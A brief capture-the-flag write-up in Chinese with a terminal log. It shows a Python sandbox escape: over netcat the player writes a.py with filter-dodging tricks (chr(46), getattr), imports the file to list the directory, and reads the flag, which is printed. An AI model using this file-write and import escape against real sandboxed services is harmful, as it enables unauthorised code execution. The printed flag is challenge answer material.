這題用到的是 open 可以讀取也可以寫入檔案
```txt
┌──(kali㉿kali)-[~/Desktop]
└─$ nc 10.42.69.10 1337                                                      
How can I help you?
>>> print('import os', file=open('a'+chr(46)+'py', 'w'))
None
                                                                                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop]
└─$ nc 10.42.69.10 1337                                                                         
How can I help you?
>>> print('result = getattr(os, "listdir")("/proc/self/cwd")', file=open('a'+chr(46)+'py', 'a'))
None
                                                                                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop]
└─$ nc 10.42.69.10 1337
How can I help you?
>>> print('print(result, file=open("out","w"))', file=open('a'+chr(46)+'py', 'a'))
None
                                                                                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop]
└─$ nc 10.42.69.10 1337
How can I help you?
>>> __import__('a')
<module 'a' from '/a.py'>
                                                                                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop]
└─$ nc 10.42.69.10 1337
How can I help you?
>>> print(*open('out'))
['sys', 'sbin', 'opt', 'bin', 'home', 'mnt', 'root', 'lib64', 'usr', 'proc', 'boot', 'lib', 'run', 'var', 'media', 'tmp', 'dev', 'etc', 'srv', 'a.', '__pycache__', 'a.py', '.dockerenv', 'flagiPNzKm5EByGhdjvU3WhQCMngRMcdyEJZGcgvBFJmE.txt', 'challenge.py']

None
                                                                                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop]
└─$ nc 10.42.69.10 1337
How can I help you?
>>> print(*open('flagiPNzKm5EByGhdjvU3WhQCMngRMcdyEJZGcgvBFJmE'+chr(46)+'txt'))
RMCTF{4g3nt1c_ch405!}

None
```
